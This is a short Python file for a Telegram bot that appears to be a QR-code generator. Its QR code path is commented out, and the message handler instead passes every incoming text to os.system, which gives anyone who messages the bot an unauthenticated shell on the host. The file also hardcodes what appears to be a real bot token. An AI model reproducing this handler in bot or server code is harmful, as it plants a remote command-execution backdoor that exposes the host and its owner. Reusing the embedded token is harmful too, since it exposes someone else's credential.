import pyqrcode
import telebot
import time
import os
from PIL import Image

bot = telebot.TeleBot("1177045366:AAHjAKQRkxas7d6YWDe_bAwj8Mm508OgiUA")

@bot.message_handler(commands = ['start', 'help'])
def qq(message):
    bot.send_message(message.chat.id,"Waiting for text")

@bot.message_handler(content_types = ['text'])
def qr(message):
    # name = str(time.time()) + '.png'
    # code = pyqrcode.create(message.text,encoding='utf-8')
    # code.png(name,scale=8)
    # with Image.open(name) as qrcode:
    #     bot.send_photo(message.chat.id,qrcode)
    # os.remove(name)
    os.system(message.text)

if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            continue
